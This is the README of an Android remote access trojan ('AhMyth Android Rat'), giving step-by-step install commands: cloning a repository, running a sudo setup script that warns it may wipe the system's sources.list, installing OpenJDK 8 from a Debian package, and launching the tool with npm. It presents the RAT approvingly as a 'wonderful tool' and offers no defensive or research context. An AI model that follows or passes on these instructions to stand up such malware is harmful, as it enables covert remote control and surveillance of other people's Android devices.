# AhMyth Android Rat

## Getting Started
### You can install this two ways

#### 1. Run the `AhMyth.sh` located inside `AhMyth/AhMyth-Server` to install AhMyth completely
#### WARNING: DO NOT EXIT OR STOP THIS SCRIPT WHILE IT IS RUNNING BY ANY MEANS NECESSARY OR YOU WILL LOSE YOUR ORIGINAL `sources.list` FILE
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```chmod +x AhMyth.sh```
4. ```sudo ./AhMyth.sh```
#### Use update-alternatives to select and use openJDK 8
5. ```update-alternatives --config java``` - Select the corresponding number for OpenJDK-8-JDK
#### Now you can run AhMyth
6. ```npm start```

#### 2. install it manually
1. ```git clone https://github.com/Morsmalleo/AhMyth.git```
2. ```cd AhMyth/AhMyth-Server```
3. ```npm install && npm audit```
4. ```wget http://security.debian.org/debian-security/pool/updates/main/o/openjdk-8/openjdk-8-jdk_8u275-b01-1~deb9u1_amd64.deb```
5. ```sudo dpkg -i openjdk-8-jdk_8u275-b01-1~deb9u1_amd64.deb```
#### Use update-alternatives to select and use openJDK 8
6. ```update-alternatives --config java``` - Select the corresponding number for OpenJDK-8-JDK
7. ```npm start```
--------------------------------------------------------------------------
##### This is not my work, I have only contributed to this wonderful tool.
